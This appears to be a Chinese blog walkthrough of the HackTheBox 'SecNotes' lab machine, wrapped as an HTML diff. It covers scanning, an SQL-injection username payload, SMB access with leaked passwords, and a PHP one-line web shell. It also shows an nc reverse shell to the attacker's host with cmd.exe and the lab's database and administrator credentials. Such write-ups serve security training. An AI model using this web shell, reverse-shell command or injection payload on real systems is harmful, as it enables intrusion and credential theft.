@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml" />
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>HackTehBox-SecNotes | Kuiba's blog - Listen to your own voice</title>
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Kuiba's blog</a></h1>
+        <h2 class="subtitle">Listen to your own voice</h2>
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/">技术水文</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/">转载搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/HTB%E6%90%AC%E8%BF%90/">HTB搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://kuibarj.top/posts/8e5dfaea.html">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Kuiba">
+       <meta itemprop="description" content="这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。">
+       <meta itemprop="image" content="/images/avatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Kuiba's blog">
+      </span>
+    </div>
+
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">HackTehBox-SecNotes</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-02-02T16:46:15+08:00">2019-02-02 16:46:15</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/" itemprop="url" rel="index"><span itemprop="name">技术水文</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1dvGeaBaE3KVjSZLe760sSFXaw.png"></p>
+<a id="more"></a>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -sV 10.10.10.97<br></code></pre></td></tr></table></figure>
+
+<p>开放了80、445、8808三个端口</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1h2ejaBCw3KVjSZFl763JkFXaE.png"><br>访问80端口，是个登录页面，注册一个账号</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user:<span class="hljs-string">' w'</span>or 1=<span class="hljs-string">'1</span><br><span class="hljs-string">pass:'</span> w<span class="hljs-string">'or 1='</span>1<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://ae01.alicdn.com/kf/HTB1gWyfaCWD3KVjSZSg763CxVXaP.png" alt="s"></p>
+<p>注册成功，使用【w’or 1=’1】登录，发现第三个笔记疑似smb之类的账号密码</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1w95larus3KVjSZKb760qkFXat.png"></p>
+<p>使用 smbclient 尝试登录smb,用户：<code>Tyler</code>，密码：<code>92g!mA8BGjOirkL%OG*&amp;</code></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //10.10.10.97/new-site -U Tyler<br></code></pre></td></tr></table></figure>
+
+<p>登录后发现该目录是web服务8808端口的根目录</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1p4yjaBCw3KVjSZFu763AOpXa6.png"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传一句话马</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">put x.php   <span class="hljs-comment">#注意，要把php放到当前运行目录下才能上传，不然不报错</span><br></code></pre></td></tr></table></figure>
+
+<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'x'</span>]))&#123;<br>  $cmd = ($_REQUEST[<span class="hljs-string">'x'</span>]);<br>  system($cmd);<br>  <span class="hljs-keyword">die</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://ae01.alicdn.com/kf/HTB1ycSdaEWF3KVjSZPh760clXXaF.png"></p>
+<p>这里要注意的是，目标机好像不是很稳定，不是php马被删就是smb断开连接，所以下面上传个nc通过之前上传的php马执行反弹一个shell回来</p>
+<figure class="hljs highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://10.10.10.97:8808/atom.php?cmd=nc<span class="hljs-number">%2010</span>.10.14.24<span class="hljs-number">%201337</span><span class="hljs-number">%20</span>-e<span class="hljs-number">%20</span>cmd.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://ae01.alicdn.com/kf/HTB1aDacawKG3KVjSZFL761MvXXaI.png"></p>
+<p>在<code>wwwroot</code>目录下找到连接数据库文件<code>db.php</code></p>
+<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> ($includes != <span class="hljs-number">1</span>) &#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR: Should not access directly."</span>);<br>&#125;<br><br><span class="hljs-comment">/* Database credentials. Assuming you are running MySQL</span><br><span class="hljs-comment">server with default setting (user 'root' with no password) */</span><br>define(<span class="hljs-string">'DB_SERVER'</span>, <span class="hljs-string">'localhost'</span>);<br>define(<span class="hljs-string">'DB_USERNAME'</span>, <span class="hljs-string">'secnotes'</span>);<br>define(<span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'q8N#9Eos%JinE57tke72'</span>);<br><span class="hljs-comment">//define('DB_USERNAME', 'root');</span><br><span class="hljs-comment">//define('DB_PASSWORD', 'qwer1234QWER!@#$');</span><br>define(<span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'secnotes'</span>);<br><br><span class="hljs-comment">/* Attempt to connect to MySQL database */</span><br>$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br>     <br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span>($link === <span class="hljs-keyword">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR: Could not connect. "</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>数据库连接文件暂时不管它了，先找<code>user.txt</code></p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1KeCdaECF3KVjSZJn762nHFXaf.png"></p>
+<p>在桌面找到user.txt，还发现了个可疑的<code>bash.lnk</code>,运行该bash报错不存在，那就查找下真正路径在哪吧，找到完整路径后重新执行运行bash</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">where</span> /R c:\ bash.exe<br><br>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://ae01.alicdn.com/kf/HTB1lAijaBGw3KVjSZFD760WEpXaF.png" alt="secnotes8.png"></p>
+<p>为了方便，使用python反弹个交互式的shell会话</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span><br></code></pre></td></tr></table></figure>
+
+<p>查看历史命令，发现曾经使用明文密码登录过smb</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -U <span class="hljs-string">'administrator%u6!4ZwgwOM#^OBf#Nwnh'</span> \\\\127.0.0.1\\c$<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://ae01.alicdn.com/kf/HTB1e9ueaBWD3KVjSZFs763qkpXaH.png"></p>
+<p>登录smb，在桌面找到root.txt</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1GlGdaA9E3KVjSZFG76319XXau.png"></p>
+
+    </main>
+    <div class="copy">
+      
+        
+  <br/>
+  <div style="text-align:center;color:#ccc;font-size:14px;">
+    ------ 本文结束 ------
+  </div>
+  <br/>
+  <div class="my_post_copyright" style="border:1px solid black;background-color:#f9f9f9">
+  	<div style="margin-left:24px">
+  	  <script src="https:////cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  	  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  	  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  	  <p><span>本文标题:</span><a href="/posts/8e5dfaea.html">HackTehBox-SecNotes</a></p>
+  	  <p><span>文章作者:</span><a href="/" title="访问 Kuiba 的个人博客">Kuiba</a></p>
+  	  <p><span>发布时间:</span>2019年02月02日 - 16:02</p>
+  	  <!--<p><span>最后更新:</span>2019年05月27日 - 17:05</p>-->
+  	  <p><span>原始链接:</span><a href="/posts/8e5dfaea.html" title="HackTehBox-SecNotes">https://kuibarj.top/posts/8e5dfaea.html</a>
+  	    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kuibarj.top/posts/8e5dfaea.html"  aria-label="复制成功！"></i></span>
+  	  </p>
+  	  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">Attribution-NonCommercial-NoDerivatives 4.0</a> 转载请保留原文链接及作者。</p>  
+  	</div>
+  </div>
+  <br/>
+  <script> 
+      var clipboard = new Clipboard('.fa-clipboard');
+        $(".fa-clipboard").click(function(){
+        clipboard.on('success', function(){
+          swal({   
+            title: "",   
+            text: '复制成功',
+            icon: "success", 
+            showConfirmButton: true
+            });
+          });
+      });  
+  </script>
+
+      
+    </div>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" rel="tag"><i class="fas fa-tags"></i>靶机渗透</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/posts/554d428f.html" rel="prev" title="小本本--备忘录"><i class="fas fa-angle-left"></i><span class="nav-title">小本本--备忘录</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/posts/ae29f7a1.html" rel="next" title="HackTheBox-Irked"><span class="nav-title">HackTheBox-Irked</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/avatar.jpg" alt="Kuiba">
+  
+  <h1 class="author-name">Kuiba</h1>
+  <h2 class="author-description">这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。</h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">37</a></div>
+    </div>
+    
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">36</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#利用"><span class="toc-text">利用</span></a></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接</p></div>
+      <ul>
+        
+        <li><i class="fas fa-envelope"></i><a href="mailto:a3VpYmFoZEBmb3htYWlsLmNvbQ" target="_blank">E-Mail</a></li>
+        
+        <li><i class="fab fa-github"></i><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><i class="fab fa-weibo"></i><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>大佬们的博客</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.ggsec.cn/" target="_blank">Demon</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://payloads.online/" target="_blank">倾旋</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://wbglil.github.io/" target="_blank">WBGlIl(装小白的巨佬)</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.sariel.top/" target="_blank">只因不值得</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://uknowsec.cn/" target="_blank">Uknowse</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://422926799.github.io/" target="_blank">九世</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://yulige.top/" target="_blank">郁离歌</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://phpinfo.me/" target="_blank">Lcy</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://867810770.github.io/" target="_blank">修心</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://vinc.top/" target="_blank">Vimc</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://qimingyu.com/" target="_blank">qimingyu</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://x.hacking8.com/" target="_blank">小草窝</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://yiwlny.github.io/" target="_blank">Rogerd</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://loulan-ling.github.io/" target="_blank">楼兰-翎师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://manmachines.github.io/" target="_blank">菜师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://whale3070.github.io/" target="_blank">whale3070</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.cnblogs.com/Secde0/" target="_blank">Secde0</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Kuiba</span><span class="year"><i class="far fa-copyright"></i>2018 - 2021</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">BY-NC-SA 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          本站托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
